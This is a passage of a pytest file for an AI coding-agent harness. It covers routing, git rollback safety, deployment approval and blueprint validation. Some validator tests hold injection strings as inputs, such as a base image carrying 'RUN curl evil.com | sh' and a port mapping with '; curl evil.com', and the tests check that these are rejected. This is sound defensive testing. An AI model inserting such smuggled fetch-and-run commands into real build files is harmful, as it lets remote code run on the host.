            state = _make_state(tmpdir)
            state["node_state"] = {"discovery_complete": False, "discovery_critical_remaining": 3}
            state["current_gate"] = "REQUIREMENTS"
            assert route_after_discovery(state) == "requirements_discovery_node"

    def test_route_after_discovery_incomplete_architecture(self):
        from harness.graph import route_after_discovery
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["node_state"] = {"discovery_complete": False, "discovery_critical_remaining": 1}
            state["current_gate"] = "ARCHITECTURE"
            assert route_after_discovery(state) == "architecture_discovery_node"

    def test_route_after_discovery_done_with_critical_deployment(self):
        """DEPLOYMENT gate with DONE + critical should route to deployment_discovery_node."""
        from harness.graph import route_after_discovery
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["node_state"] = {"user_done_with_critical": True, "discovery_complete": False,
                                    "discovery_critical_remaining": 2}
            state["current_gate"] = "DEPLOYMENT"
            result = route_after_discovery(state)
            assert result == "deployment_discovery_node"


class TestGatekeeperRouting:

    def test_route_after_gatekeeper_approve_requirements(self):
        from harness.graph import route_after_gatekeeper
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["current_gate"] = "REQUIREMENTS"
            state["node_state"] = {"gatekeeper_action": "approve"}
            assert route_after_gatekeeper(state) == "architecture_discovery_node"

    def test_route_after_gatekeeper_approve_architecture(self):
        from harness.graph import route_after_gatekeeper
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["current_gate"] = "ARCHITECTURE"
            state["node_state"] = {"gatekeeper_action": "approve"}
            assert route_after_gatekeeper(state) == "patching_node"

    def test_route_after_gatekeeper_refine(self):
        from harness.graph import route_after_gatekeeper
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["current_gate"] = "REQUIREMENTS"
            state["node_state"] = {"gatekeeper_action": "refine"}
            assert route_after_gatekeeper(state) == "requirements_discovery_node"

    def test_route_after_gatekeeper_approve_deployment(self):
        from harness.graph import route_after_gatekeeper
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["current_gate"] = "DEPLOYMENT"
            state["node_state"] = {"gatekeeper_action": "approve"}
            assert route_after_gatekeeper(state) == "deployment_node"


class TestGitGuardianLifecycle:
    """Regression tests for git lifecycle fixes: scoped add + untracked cleanup."""

    @staticmethod
    def _git_init(workspace: str) -> None:
        import subprocess
        subprocess.run(["git", "init", "-q", "--initial-branch=main"], cwd=workspace, check=True)
        subprocess.run(["git", "config", "user.email", "t@t"], cwd=workspace, check=True)
        subprocess.run(["git", "config", "user.name", "t"], cwd=workspace, check=True)
        subprocess.run(["git", "config", "commit.gpgsign", "false"], cwd=workspace, check=True)
        # Initial commit so HEAD exists
        readme = os.path.join(workspace, "README.md")
        with open(readme, "w") as f:
            f.write("initial\n")
        subprocess.run(["git", "add", "README.md"], cwd=workspace, check=True)
        subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=workspace, check=True)

    def test_commit_refuses_when_modified_files_empty(self):
        # Regression: previously `git add -A` would stage any stray file the
        # LLM dropped (or pre-existing user dirt) and commit it.
        from harness.security import GitGuardian
        with tempfile.TemporaryDirectory() as ws:
            self._git_init(ws)
            # Create a stray file the harness didn't touch
            with open(os.path.join(ws, "stray.txt"), "w") as f:
                f.write("not the harness's\n")
            gg = GitGuardian(ws)
            gg.create_patch_branch("sess1")
            ok = gg.commit_all_changes("sess1", [], exit_code=0)
            assert ok is False
            # The stray file is still untracked, not committed
            import subprocess
            status = subprocess.run(["git", "status", "--porcelain"], cwd=ws, capture_output=True, text=True)
            assert "?? stray.txt" in status.stdout

    def test_commit_scopes_to_modified_files_only(self):
        from harness.security import GitGuardian
        with tempfile.TemporaryDirectory() as ws:
            self._git_init(ws)
            # Stray file (user-introduced)
            with open(os.path.join(ws, "stray.txt"), "w") as f:
                f.write("not the harness's\n")
            # Harness-created file
            with open(os.path.join(ws, "patch.py"), "w") as f:
                f.write("print('hi')\n")
            gg = GitGuardian(ws)
            gg.create_patch_branch("sess1")
            ok = gg.commit_all_changes("sess1", ["patch.py"], exit_code=0)
            assert ok is True
            # patch.py is committed; stray.txt is still untracked
            import subprocess
            ls = subprocess.run(["git", "ls-tree", "HEAD"], cwd=ws, capture_output=True, text=True)
            assert "patch.py" in ls.stdout
            assert "stray.txt" not in ls.stdout
            status = subprocess.run(["git", "status", "--porcelain"], cwd=ws, capture_output=True, text=True)
            assert "?? stray.txt" in status.stdout

    def test_rollback_removes_untracked_llm_files(self):
        # Regression: `git checkout -- .` only restores tracked files. Any
        # file the LLM created during the session (e.g. leaked secrets,
        # scratch files) would persist after rollback unless removed.
        from harness.security import GitGuardian
        with tempfile.TemporaryDirectory() as ws:
            self._git_init(ws)
            gg = GitGuardian(ws)
            gg.create_patch_branch("sess1")
            # LLM creates a fresh file
            llm_file = os.path.join(ws, "leaked.env")
            with open(llm_file, "w") as f:
                f.write("API_KEY=secret\n")
            assert os.path.exists(llm_file)
            # User's own untracked file — must survive rollback
            user_file = os.path.join(ws, "my-notes.txt")
            with open(user_file, "w") as f:
                f.write("my work\n")

            ok = gg.rollback(modified_files=["leaked.env"])
            assert ok is True
            assert not os.path.exists(llm_file), "LLM-created untracked file should be removed"
            assert os.path.exists(user_file), "user's untracked file must not be removed"

    def test_rollback_without_modified_files_warns_but_succeeds(self):
        from harness.security import GitGuardian
        with tempfile.TemporaryDirectory() as ws:
            self._git_init(ws)
            gg = GitGuardian(ws)
            gg.create_patch_branch("sess1")
            # Should not raise; degraded behavior is OK for the crash-path call.
            assert gg.rollback() is True

    def test_rollback_rejects_paths_outside_workspace(self):
        # Defense in depth: even if modified_files somehow contains a
        # traversal entry, the cleanup must not delete files outside.
        from harness.security import GitGuardian
        with tempfile.TemporaryDirectory() as outer:
            ws = os.path.join(outer, "ws")
            os.makedirs(ws)
            self._git_init(ws)
            # File outside workspace
            sentinel = os.path.join(outer, "outside.txt")
            with open(sentinel, "w") as f:
                f.write("preserve me\n")

            gg = GitGuardian(ws)
            gg.create_patch_branch("sess1")
            gg.rollback(modified_files=["../outside.txt"])
            assert os.path.exists(sentinel)


class TestSecurityScanRouting:

    def test_route_after_security_scan_clean(self):
        from harness.graph import route_after_security_scan
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["budget_remaining_usd"] = 1.0
            state["compiler_errors"] = []
            assert route_after_security_scan(state) == "deployment_discovery_node"

    def test_route_after_security_scan_findings(self):
        # Security findings route to repair_node (not patching_node) so
        # the LLM gets the structured _format_diagnostics_for_repair
        # block and the security-aware framing sentence. The earlier
        # routing to patching_node sent only an unstructured system
        # message and missed the canonical diagnostic shape.
        from harness.graph import route_after_security_scan
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["budget_remaining_usd"] = 1.0
            state["compiler_errors"] = [{"file": "test.py", "message": "secret found"}]
            state["loop_counter"] = {"security": 0}
            assert route_after_security_scan(state) == "repair_node"

    def test_route_after_security_scan_max_attempts(self):
        from harness.graph import route_after_security_scan
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["budget_remaining_usd"] = 1.0
            state["compiler_errors"] = [{"file": "test.py", "message": "secret found"}]
            state["loop_counter"] = {"security": 2}
            assert route_after_security_scan(state) == "human_intervention_node"

    def test_route_after_security_scan_budget_exhausted(self):
        from harness.graph import route_after_security_scan
        with tempfile.TemporaryDirectory() as tmpdir:
            state = _make_state(tmpdir)
            state["budget_remaining_usd"] = 0.0
            assert route_after_security_scan(state) == "human_intervention_node"

    def test_route_after_security_scan_flutter_skips_deploy(self):
        # M-1: Flutter projects with a clean security scan end after the
        # scan rather than entering the docker-compose pipeline.
        import os
        from harness.graph import route_after_security_scan
        with tempfile.TemporaryDirectory() as tmpdir:
            # Make it look like a Flutter project
            with open(os.path.join(tmpdir, "pubspec.yaml"), "w") as f:
                f.write("name: my_app\n")
            os.makedirs(os.path.join(tmpdir, "lib"))
            state = _make_state(tmpdir)
            state["budget_remaining_usd"] = 1.0
            state["compiler_errors"] = []
            assert route_after_security_scan(state) == "__end__"


# ===========================================================================
# DEPLOY TESTS
# ===========================================================================

class TestDeployTelemetry:

    def test_scan_empty_workspace(self):
        from harness.deploy import scan_workspace_telemetry
        with tempfile.TemporaryDirectory() as tmpdir:
            telemetry = scan_workspace_telemetry(tmpdir)
            assert telemetry["app_name"] == os.path.basename(tmpdir)
            assert isinstance(telemetry["languages"], list)
            assert isinstance(telemetry["databases_detected"], list)

    def test_scan_python_project(self):
        from harness.deploy import scan_workspace_telemetry
        with tempfile.TemporaryDirectory() as tmpdir:
            Path(os.path.join(tmpdir, "pyproject.toml")).touch()
            Path(os.path.join(tmpdir, "requirements.txt")).touch()
            os.makedirs(os.path.join(tmpdir, "src"))
            telemetry = scan_workspace_telemetry(tmpdir)
            assert "python" in telemetry["languages"]
            assert "src" in telemetry["src_directories"]

    def test_scan_docker_project(self):
        from harness.deploy import scan_workspace_telemetry
        with tempfile.TemporaryDirectory() as tmpdir:
            Path(os.path.join(tmpdir, "Dockerfile")).touch()
            Path(os.path.join(tmpdir, "docker-compose.yml")).touch()
            telemetry = scan_workspace_telemetry(tmpdir)
            assert telemetry["existing_infrastructure"]["dockerfile"] is True
            assert telemetry["existing_infrastructure"]["docker_compose"] is True


class TestDeployPreviewGate:
    """Regression: deployment_node used to docker-compose-up LLM-generated
    containers with zero preview or confirmation."""

    def test_auto_approve_when_env_set(self, monkeypatch):
        from harness.deploy import _auto_approve_deploy
        monkeypatch.setenv("HARNESS_AUTO_APPROVE", "true")
        assert _auto_approve_deploy() is True

    def test_auto_approve_when_ci_set(self, monkeypatch):
        from harness.deploy import _auto_approve_deploy
        monkeypatch.delenv("HARNESS_AUTO_APPROVE", raising=False)
        monkeypatch.setenv("CI", "true")
        assert _auto_approve_deploy() is True

    def test_no_auto_approve_when_unset(self, monkeypatch):
        from harness.deploy import _auto_approve_deploy
        monkeypatch.delenv("HARNESS_AUTO_APPROVE", raising=False)
        monkeypatch.delenv("CI", raising=False)
        assert _auto_approve_deploy() is False

    def test_preview_contains_generated_artifacts(self):
        from harness.deploy import _read_preview
        with tempfile.TemporaryDirectory() as ws:
            with open(os.path.join(ws, "docker-compose.yml"), "w") as f:
                f.write("services:\n  app:\n    image: x\n")
            with open(os.path.join(ws, "Dockerfile"), "w") as f:
                f.write("FROM python:3.12\nRUN echo hi\n")
            preview = _read_preview(ws, ["Dockerfile", "docker-compose.yml"])
            assert "services:" in preview
            assert "FROM python:3.12" in preview
            assert "Dockerfile" in preview

    def test_preview_truncates_huge_files(self):
        from harness.deploy import _read_preview, _PREVIEW_MAX_CHARS
        with tempfile.TemporaryDirectory() as ws:
            huge = "X" * (_PREVIEW_MAX_CHARS + 5000)
            with open(os.path.join(ws, "docker-compose.yml"), "w") as f:
                f.write(huge)
            preview = _read_preview(ws, [])
            assert "truncated" in preview
            assert len(preview) < len(huge)

    @pytest.mark.asyncio
    async def test_prompt_returns_true_with_auto_approve(self, monkeypatch):
        from harness.deploy import _prompt_deploy_approval
        monkeypatch.setenv("HARNESS_AUTO_APPROVE", "true")
        assert await _prompt_deploy_approval("preview") is True

    @pytest.mark.asyncio
    async def test_prompt_fails_closed_on_non_tty_without_optin(self, monkeypatch):
        # Non-TTY + no opt-in env var → fail closed (refuse deploy).
        import io
        from harness import deploy
        monkeypatch.delenv("HARNESS_AUTO_APPROVE", raising=False)
        monkeypatch.delenv("CI", raising=False)
        # Replace sys.stdin with a non-TTY stream
        monkeypatch.setattr(deploy.sys, "stdin", io.StringIO("y\n"))
        assert await deploy._prompt_deploy_approval("preview") is False


class TestDeployValidation:
    """Regression: blueprint identifiers used to interpolate raw into
    Dockerfile/compose/Caddyfile, allowing injection via newline / `;`."""

    def test_validator_accepts_clean_blueprint(self):
        from harness.deploy import _validate_blueprint
        bp = {
            "services": {
                "api": {
                    "base_image": "python:3.12-slim",
                    "ports": ["8080:8080"],
                    "environment_keys_needed": ["DATABASE_URL", "PORT"],
                    "depends_on_services": ["db"],
                },
                "db": {"base_image": "postgres:16-alpine"},
            }
        }
        assert _validate_blueprint(bp) == []

    def test_validator_rejects_newline_in_image(self):
        from harness.deploy import _validate_blueprint
        bp = {"services": {"api": {"base_image": "python:3.12\nRUN curl evil.com | sh"}}}
        errors = _validate_blueprint(bp)
        assert any("invalid base_image" in e for e in errors)

    def test_validator_rejects_yaml_break_in_service_name(self):
        from harness.deploy import _validate_blueprint
        bp = {"services": {"api\n  evil:\n    image: bad": {"base_image": "ubuntu:22.04"}}}
        errors = _validate_blueprint(bp)
        assert any("invalid service name" in e for e in errors)

    def test_validator_rejects_bad_env_var_name(self):
        from harness.deploy import _validate_blueprint
        bp = {"services": {"api": {
            "base_image": "python:3.12",
            "environment_keys_needed": ["KEY=VAL\nINJECTED"],
        }}}
        errors = _validate_blueprint(bp)
        assert any("invalid env var name" in e for e in errors)

    def test_validator_rejects_bad_port_mapping(self):
        from harness.deploy import _validate_blueprint
        bp = {"services": {"api": {
            "base_image": "python:3.12",
            "ports": ["8080; curl evil.com"],
        }}}
        errors = _validate_blueprint(bp)
        assert any("invalid port mapping" in e for e in errors)

    def test_generate_assets_refuses_bad_blueprint(self):
        from harness.deploy import generate_assets_from_blueprint
        with tempfile.TemporaryDirectory() as ws:
            bp = {"services": {"api": {"base_image": "python:3.12\nRUN bad"}}}
            result = generate_assets_from_blueprint(bp, {"languages": ["python"]}, ws)
            assert result["success"] is False
            assert "rejected by validator" in result["message"]
            # No files were generated
            assert "Dockerfile" not in os.listdir(ws)
            assert "docker-compose.yml" not in os.listdir(ws)

    def test_compose_includes_resource_limits(self):
        from harness.deploy import _generate_compose_file
        bp = {
            "services": {
                "api": {
                    "base_image": "python:3.12-slim",
                    "ports": ["8080:8080"],
                },
            }
        }
        compose = _generate_compose_file(bp)
        assert "mem_limit:" in compose
        assert "cpus:" in compose
        assert "pids_limit:" in compose

    def test_compose_respects_per_service_limit_override(self):
        from harness.deploy import _generate_compose_file
        bp = {
            "services": {
                "api": {
                    "base_image": "python:3.12-slim",
                    "limits": {"memory": "2g", "cpus": "2.0", "pids": 500},
                }
            }
        }
        compose = _generate_compose_file(bp)
        assert "mem_limit: 2g" in compose
        assert 'cpus: "2.0"' in compose
        assert "pids_limit: 500" in compose


class TestDeployBlueprint:

    def test_fallback_blueprint(self):
        from harness.deploy import _fallback_blueprint
        telemetry = {
            "app_name": "test-app",
            "languages": ["python"],
            "src_directories": ["src"],
            "databases_detected": ["postgres", "redis"],
            "web_servers_detected": ["caddy"],
            "frameworks_detected": ["fastapi"],
        }
        blueprint = _fallback_blueprint(telemetry)
        assert "services" in blueprint
        assert "postgres" in blueprint["services"]
        assert "redis" in blueprint["services"]
        assert "caddy" in blueprint["services"]
        assert blueprint["proxy_service"] == "caddy"

    def test_generate_compose_file_ports(self):
        from harness.deploy import _generate_compose_file
        blueprint = {
            "services": {
                "api": {
                    "base_image": "python:3.12-slim",
                    "build_context": "./api",
                    "ports": ["8000:8000", "9000:9000"],
                    "environment_keys_needed": ["DB_HOST"],
                    "depends_on_services": ["postgres"],
                    "requires_healthcheck_cmd": "curl -f http://localhost:8000/health || exit 1",
                    "volumes": ["./api:/app"],
                },
            },
            "volumes": {},
            "networks": {"app-net": {"driver": "bridge"}},
        }
        compose = _generate_compose_file(blueprint)
        assert "version:" in compose
        assert "services:" in compose
        assert "api:" in compose
        # BUG TEST: compose generation duplicates "ports:" header for each port mapping
        assert "8000:8000" in compose

    def test_generate_caddyfile(self):
        from harness.deploy import _generate_caddyfile
        blueprint = {
            "services": {
                "api": {"ports": ["8000:8000"]},
                "web": {"ports": ["3000:3000"]},
            }
        }
        caddy = _generate_caddyfile(blueprint)
        assert "reverse_proxy" in caddy
        assert "api:8000" in caddy

    def test_dockerfile_name_first_service_uses_plain_dockerfile(self):
        # First build-context service uses plain "Dockerfile" so Docker's
        # default lookup works for single-service projects.
        from harness.deploy import _dockerfile_name_for
        services = {
            "api": {"build_context": "./api"},
            "worker": {"build_context": "./worker"},
            "postgres": {"base_image": "postgres:16"},  # no build_context
        }
        assert _dockerfile_name_for("api", services) == "Dockerfile"
        assert _dockerfile_name_for("worker", services) == "Dockerfile.worker"
        assert _dockerfile_name_for("postgres", services) == ""

    def test_compose_and_generation_dockerfile_names_agree(self):
        # Regression for the original Bug 3: compose used "build_context != '.'"
        # while generation used "first service vs others" — they could disagree
        # and produce missing-file errors. Both must now route through
        # _dockerfile_name_for.
        from harness.deploy import _generate_compose_file, _dockerfile_name_for
        services = {
            "api": {"build_context": "./api", "ports": ["8000:8000"]},
            "worker": {"build_context": "./worker"},
        }
        blueprint = {"services": services, "volumes": {}, "networks": {}}
        compose = _generate_compose_file(blueprint)
        for svc_name in services:
            expected = _dockerfile_name_for(svc_name, services)
            if expected:
                assert f"dockerfile: {expected}" in compose, (
                    f"compose missing dockerfile: {expected} for service {svc_name}"
                )


# ===========================================================================
# IMPACT TESTS
# ===========================================================================

class TestImpactAnalyzer:

    def test_create_analyzer(self):
        from harness.impact import ImpactAnalyzer
        with tempfile.TemporaryDirectory() as tmpdir:
            analyzer = ImpactAnalyzer(workspace_path=tmpdir, max_scan_files=10)
            assert analyzer.enabled is True

    def test_analyze_no_files(self):
        from harness.impact import ImpactAnalyzer
        with tempfile.TemporaryDirectory() as tmpdir:
            analyzer = ImpactAnalyzer(workspace_path=tmpdir)
            result = analyzer.analyze([])
            assert result.total_impacted == 0

    def test_dependency_graph_build_empty(self):
        from harness.impact import DependencyGraph
        with tempfile.TemporaryDirectory() as tmpdir:
            graph = DependencyGraph(workspace_path=tmpdir)
            count = graph.build()
            assert count == 0

    def test_dependency_graph_build_with_python(self):
        from harness.impact import DependencyGraph
        with tempfile.TemporaryDirectory() as tmpdir:
            src = os.path.join(tmpdir, "src")
            os.makedirs(src)
            with open(os.path.join(src, "module_a.py"), "w") as f:
                f.write("def foo():\n    pass\n")
            with open(os.path.join(src, "module_b.py"), "w") as f:
                f.write("from module_a import foo\n\ndef bar():\n    pass\n")
            graph = DependencyGraph(workspace_path=tmpdir)
            count = graph.build()
            assert count > 0

    def test_impact_result_has_impact(self):
        from harness.impact import ImpactResult
        result = ImpactResult(modified_files=["a.py"], total_impacted=3)
        assert result.has_impact()

    def test_dependency_graph_marks_incomplete_when_scan_limit_hit(self):
        # Regression: hitting max_scan_files used to silently mark the graph
        # "built" with no incomplete flag — callers thought results were
        # exhaustive when they were actually a partial view.
        from harness.impact import DependencyGraph
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create 6 small Python files but set max_scan_files=2
            for i in range(6):
                with open(os.path.join(tmpdir, f"mod_{i}.py"), "w") as f:
                    f.write(f"def f{i}(): pass\n")
            graph = DependencyGraph(workspace_path=tmpdir, max_scan_files=2)
            graph.build()
            assert graph.incomplete is True
            assert graph.files_scanned == 2

    def test_dependency_graph_complete_when_under_limit(self):
        from harness.impact import DependencyGraph
        with tempfile.TemporaryDirectory() as tmpdir:
            for i in range(3):
                with open(os.path.join(tmpdir, f"mod_{i}.py"), "w") as f:
                    f.write(f"def f{i}(): pass\n")
            graph = DependencyGraph(workspace_path=tmpdir, max_scan_files=100)
            graph.build()
            assert graph.incomplete is False
            assert graph.files_scanned == 3

    def test_impact_result_propagates_incomplete_flag(self):
        from harness.impact import ImpactAnalyzer
        with tempfile.TemporaryDirectory() as tmpdir:
            for i in range(6):
                with open(os.path.join(tmpdir, f"mod_{i}.py"), "w") as f:
                    f.write(f"def f{i}(): pass\n")
            analyzer = ImpactAnalyzer(workspace_path=tmpdir, max_scan_files=2)
            result = analyzer.analyze(["mod_0.py"])
            assert result.graph_incomplete is True
            assert result.files_scanned == 2

    def test_incomplete_scan_with_no_impact_still_warns(self):
        # Regression-of-regression: when impacted_files is empty AND scan
        # was incomplete, the user must still be told the result is unreliable.
        from harness.impact import ImpactAnalyzer
        with tempfile.TemporaryDirectory() as tmpdir:
            for i in range(6):
                with open(os.path.join(tmpdir, f"mod_{i}.py"), "w") as f:
                    f.write(f"def f{i}(): pass\n")
            analyzer = ImpactAnalyzer(workspace_path=tmpdir, max_scan_files=2)
            result = analyzer.analyze(["mod_0.py"])
            # No imports between files = no impact, but graph is incomplete.
            if not result.has_impact():
                assert "INCOMPLETE" in result.warning
                assert "lower bound" in result.warning or "missed" in result.warning

    def test_impact_result_no_impact(self):
        from harness.impact import ImpactResult
        result = ImpactResult(modified_files=["a.py"], total_impacted=0)
        assert not result.has_impact()

    def test_extension_mapping(self):
        from harness.impact import _EXTENSION_TO_TREE_SITTER
        assert _EXTENSION_TO_TREE_SITTER[".py"] == "python"
        assert _EXTENSION_TO_TREE_SITTER[".go"] == "go"
        assert _EXTENSION_TO_TREE_SITTER[".rs"] == "rust"


# ===========================================================================
# PARSER REGISTRY TESTS
# ===========================================================================

class TestParserRegistry:

    def test_register_parser(self):
        from harness.parser_registry import register_parser, get_parser
        from harness.sandbox import BaseLanguageParser, DiagnosticObject

        class TestParser(BaseLanguageParser):
            @staticmethod
            def parse_diagnostics(raw_output: str) -> list:
                return [DiagnosticObject(file="test.txt", message="test")]

        register_parser("testc", TestParser)
        retrieved = get_parser("testc")
        assert retrieved is not None
        diags = retrieved.parse_diagnostics("")
        assert len(diags) == 1

    def test_get_parser_unknown(self):
        from harness.parser_registry import get_parser
        assert get_parser("nonexistent_compiler") is None

    def test_strip_ansi_removes_color_codes(self):
        from harness.parser_registry import _strip_ansi
        # SGR (color) codes
        assert _strip_ansi("\x1b[31merror\x1b[0m: undefined") == "error: undefined"
        # Bold + color combined
        assert _strip_ansi("\x1b[1;33mwarning\x1b[0m") == "warning"
        # OSC (hyperlink) escapes used by modern terminals
        assert _strip_ansi("\x1b]8;;file:///x\x07click\x1b]8;;\x07") == "click"

    def test_detect_and_parse_strips_ansi_before_dispatching(self):
        # Regression: cargo/rustc/etc emit \x1b[31m... when CARGO_TERM_COLOR=always
        # is set in the env; the colorized diagnostic line never matched any
        # regex and was silently dropped.
        from harness.parser_registry import detect_and_parse
        colored = "\x1b[1;31merror\x1b[0m: \x1b[1msrc/main.go:10:5: undefined: xyz\x1b[0m\n"
        diags = detect_and_parse(colored, build_command="go build", workspace_path="/x")
        # Must extract at least one diagnostic from the colorized output
        assert len(diags) >= 1
        assert any("xyz" in d.message or "main.go" in d.file for d in diags)

    def test_detect_and_parse_go(self):
        from harness.parser_registry import detect_and_parse
        output = "main.go:5:10: undefined: xyz\n"
        diags = detect_and_parse(output, build_command="go build")
        assert len(diags) == 1
        assert "main.go" in diags[0].file

    def test_detect_and_parse_python(self):
        from harness.parser_registry import detect_and_parse
        output = """Traceback (most recent call last):
  File "test.py", line 10, in main
ZeroDivisionError: division by zero"""
        diags = detect_and_parse(output, build_command="python test.py")
        assert len(diags) >= 0

    def test_generic_parser_captures_rust_span_context(self):
        # Regression: Rust ` --> file:line | code | ^^^ ` annotation blocks
        # under a primary error used to be silently dropped. semantic_context
        # should now contain the full multi-line span so the repair node has
        # the same view the developer would.
        from harness.parser_registry import GenericParser
        output = """src/main.rs:10:5: error: cannot find type `Foo` in this scope
  --> src/main.rs:10:5
   |
10 |     let x: Foo = bar();
   |            ^^^ not found in this scope
   |
   = help: consider importing this struct"""
        diags = GenericParser.parse_diagnostics(output)
        assert len(diags) == 1
        ctx = diags[0].semantic_context
        assert "let x: Foo" in ctx, f"missing source snippet in context: {ctx}"
        assert "help:" in ctx, f"missing help hint in context: {ctx}"

    def test_generic_parser_captures_gcc_note_followon(self):
        from harness.parser_registry import GenericParser
        output = """main.c:5:3: error: incompatible types when initializing
   5 |   int x = "hello";
     |   ^
note: each undeclared identifier
main.c:8:1: warning: unused variable"""
        diags = GenericParser.parse_diagnostics(output)
        # Two primary diagnostics; the first should have collected the note
        # and caret as semantic_context.
        assert len(diags) == 2
        assert diags[0].semantic_context, "first diag context empty"
        assert "note:" in diags[0].semantic_context
        # The second diag (warning) should be parsed independently, not
        # swallowed into the first one's context.
        assert "unused variable" in diags[1].message

    def test_go_parser_captures_indented_context(self):
        # Go's `cannot use X as Y` errors emit a couple of tab-indented
        # `have ... / want ...` lines under the primary.
        from harness.parser_registry import GoParser
        output = """cmd/main.go:42:10: cannot use x (type int) as type string in argument
\thave int
\twant string
cmd/other.go:5:1: undefined: foo"""
        diags = GoParser.parse_diagnostics(output)
        assert len(diags) == 2
        assert "have int" in diags[0].semantic_context
        assert "want string" in diags[0].semantic_context
        # Second diag must not have the first one's context.
        assert "have int" not in diags[1].semantic_context

    def test_context_collection_does_not_swallow_next_primary(self):
        # Defense: two back-to-back primary diagnostics with no context
        # between them must both be parsed cleanly, not merged.
        from harness.parser_registry import GenericParser
        output = """a.c:1:1: error: first
b.c:2:2: error: second"""
        diags = GenericParser.parse_diagnostics(output)
        assert len(diags) == 2
        assert diags[0].semantic_context == ""
        assert diags[1].semantic_context == ""

    def test_list_registered_parsers(self):
        from harness.parser_registry import list_registered_parsers
        result = list_registered_parsers()
        assert "compiler" in result
        assert "extension" in result
        assert "rustc" in result["compiler"]


# ===========================================================================
# CLI TESTS
# ===========================================================================

class TestCLI:

    def test_build_parser(self):
        from harness.cli import build_parser
        parser = build_parser()
        assert parser.prog == "harness"

    def test_discovery_off_by_default(self):
        # Regression: the exhaustive 8-sector discovery pipeline used to run
        # on every invocation. It now requires explicit --discover.
        from harness.cli import build_parser
        parser = build_parser()
        args = parser.parse_args(["run", "--workspace", ".", "--prompt", "t"])
        assert getattr(args, "discover", False) is False

    def test_discover_flag_enables_discovery(self):
        from harness.cli import build_parser
        parser = build_parser()
        args = parser.parse_args(["run", "--workspace", ".", "--prompt", "t", "--discover"])
        assert args.discover is True

    def test_skip_discovery_flag_still_parses_for_backcompat(self):
        # Old --skip-discovery flag is preserved as a no-op so existing scripts
        # don't break. The new default already skips discovery anyway.
        from harness.cli import build_parser
        parser = build_parser()
        args = parser.parse_args(["run", "--workspace", ".", "--prompt", "t", "--skip-discovery"])
        # The flag parses without error; it doesn't change the discovery decision
        # (discover stays False; that's already the default).
        assert getattr(args, "discover", False) is False

    def test_validate_config_strict_raises_on_typo(self):
        # The harness consolidated to a single canonical config file
        # (config/config.json) and validation became strict: typos must
        # raise ConfigError instead of just logging a warning. The
        # comprehensive tests live in tests/test_cli_basics.py — this
        # one is just a regression check that the API is still wired up
        # at the same import path expected by older callers.
        import pytest
        from harness.cli import validate_config_strict, ConfigError
        bad = {"model_routin": {"planning_primary": "x"}}
        with pytest.raises(ConfigError) as exc:
            validate_config_strict(bad, source="/fake/path.json")
        assert "Unknown top-level key 'model_routin'" in str(exc.value)
        assert "model_routing" in str(exc.value)  # difflib suggestion

    def test_strip_comments_removes_underscore_keys(self):
        # _comment keys are stripped from the loaded config so strict
        # validation never sees them.
        from harness.cli import _strip_comments
        out = _strip_comments({
            "_comment": "doc",
            "build_command": "make",
            "sandbox": {"_comment": "doc", "backend": "auto"},
        })
        assert "_comment" not in out
        assert "_comment" not in out["sandbox"]
        assert out["build_command"] == "make"
        assert out["sandbox"]["backend"] == "auto"

    def test_resolve_build_command_cli(self):
        from harness.cli import resolve_build_command
        result = resolve_build_command("custom build", {"build_command": "make build"})
        assert result == "custom build"

    def test_resolve_build_command_config(self):
        from harness.cli import resolve_build_command
        result = resolve_build_command(None, {"build_command": "cmake build"})
        assert result == "cmake build"

    def test_resolve_build_command_default(self):
        from harness.cli import resolve_build_command
        result = resolve_build_command(None, {})
        assert result == "make build"

    def test_detect_build_command_makefile_wins(self):
        from harness.cli import _detect_default_build_command
        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "Makefile").write_text("build:\n\techo ok\n")
            Path(tmpdir, "pyproject.toml").write_text("[project]\nname='x'\n")
            assert _detect_default_build_command(tmpdir) == "make build"

    def test_detect_build_command_python_requirements(self):
        from harness.cli import _detect_default_build_command
        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "requirements.txt").write_text("pytest\n")
            cmd = _detect_default_build_command(tmpdir)
            assert cmd is not None
            assert "pip install -r requirements.txt" in cmd
            assert "pytest" in cmd

    def test_detect_build_command_python_pyproject(self):
        from harness.cli import _detect_default_build_command
        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "pyproject.toml").write_text("[project]\nname='x'\n")
            cmd = _detect_default_build_command(tmpdir)
            assert cmd is not None
            assert "pip install -e" in cmd
            assert "pytest" in cmd

    def test_detect_build_command_node(self):
        from harness.cli import _detect_default_build_command
        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "package.json").write_text('{"name":"x"}')
            assert _detect_default_build_command(tmpdir) == "npm install && npm test"

    def test_detect_build_command_loose_python_files(self):
        # Fix 2a: the bare-.py fallback must prepend a pip install step.
        # Before this change the branch returned bare ``python3 -m pytest -q``,
        # which trips pytest-not-installed on every greenfield workspace
        # and wedges the repair loop (the LLM keeps editing manifests
        # the build_command never consults).
        from harness.cli import _detect_default_build_command
        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "main.py").write_text("print('hi')\n")
            assert _detect_default_build_command(tmpdir) == (
                "python3 -m pip install pytest && python3 -m pytest -q"
            )

    def test_detect_build_command_no_hints_returns_none(self):
        from harness.cli import _detect_default_build_command
        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "README.md").write_text("hi\n")
            assert _detect_default_build_command(tmpdir) is None

    def test_resolve_build_command_uses_workspace_detection(self):
        # Regression: when no CLI flag and no config build_command, the
        # resolver must sniff the workspace before falling back to make.
        from harness.cli import resolve_build_command
        with tempfile.TemporaryDirectory() as tmpdir:
            Path(tmpdir, "requirements.txt").write_text("fastapi\n")
            cmd = resolve_build_command(None, {}, tmpdir)
